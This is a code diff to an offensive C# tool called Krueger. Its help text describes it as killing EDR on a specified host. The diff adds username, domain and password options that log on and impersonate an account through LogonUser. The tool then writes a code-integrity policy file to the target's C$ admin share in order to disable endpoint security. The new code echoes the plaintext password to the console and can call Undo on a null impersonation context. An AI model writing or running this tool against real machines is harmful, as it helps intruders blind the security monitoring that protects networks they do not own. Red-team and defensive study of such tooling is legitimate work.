@@ -7,6 +7,8 @@ using System.DirectoryServices;
 using System.DirectoryServices.ActiveDirectory;
 using System.IO;
 using System.Runtime.Remoting.Contexts;
+using System.ComponentModel;
+using System.Runtime.InteropServices;
 
 namespace Krueger.Modules
 {
@@ -18,7 +20,11 @@ namespace Krueger.Modules
                 "Krueger.exe [Options]\n\n" +
                 "Options:\n" +
                 "\t-h/--help                -     Display this help menu\n" +
-                "\t--host <hostname>        -     Kill EDR on a specified host\n";
+                "\t--host <hostname>        -     Kill EDR on a specified host\n" +
+                "\t--username <username>    -     A username to use for authentication\n" +
+                "\t--domain <domain>        -     A domain to use for authentication\n" +
+                "\t--password <password>    -     A password to use for authentication\n"
+                ;
 
             Console.WriteLine(help);
         }
@@ -68,8 +74,11 @@ namespace Krueger.Modules
             else if (args.Length > 0)
             {
                 string host = null;
+                string username = null;
+                string password = null;
+                string domain = null;
 
-                string[] flags = { "--host" };
+                string[] flags = { "--host" , "--username", "--password", "--domain" };
                 string[] options = { };
 
                 Dictionary<string, string> cmd = Parse(args, flags, options);
@@ -79,9 +88,40 @@ namespace Krueger.Modules
                 }
 
                 cmd.TryGetValue("--host", out host);
+                cmd.TryGetValue("--username", out username);
+                cmd.TryGetValue("--password", out password);
+                cmd.TryGetValue("--domain", out domain);
+
+                WindowsImpersonationContext impersonationContext = null;
 
                 if (host != null)
                 {
+                    if (username != null || password != null)
+                    {
+                        if(username != null && password != null)
+                        {
+                            if(domain == null)
+                                domain = Domain.GetCurrentDomain().Name;
+
+                            IntPtr intPtr = IntPtr.Zero;
+                            bool logon = Interop.LogonUser(username, domain, password, (int)LogonType.LOGON32_LOGON_NEW_CREDENTIALS, (int)LogonProvider.LOGON32_PROVIDER_DEFAULT, ref intPtr);
+                            if (logon)
+                            {
+                                impersonationContext = WindowsIdentity.Impersonate(intPtr);
+                                Console.WriteLine($"[+] Impersonated {domain}\\{username}:{password}");
+                            }
+                            else
+                            {
+                                string errorMessage = new Win32Exception(Marshal.GetLastWin32Error()).Message;
+                                Console.WriteLine("[!] Error: " + errorMessage);
+                                return;
+                            }
+                        }
+                        else
+                        {
+                            Console.WriteLine("[!] For alternative credentials a username and password must be specified");
+                        }
+                    }
 
                     Console.WriteLine("[+] Launching attack on " + host);
                     string target = @"\\" + host + @"\C$\Windows\System32\CodeIntegrity\SiPolicy.p7b";
@@ -97,6 +137,7 @@ namespace Krueger.Modules
                     {
                         Console.WriteLine("[!] Target has not been rebooted");
                     }
+                    impersonationContext.Undo();
                 }
                 else
                 {
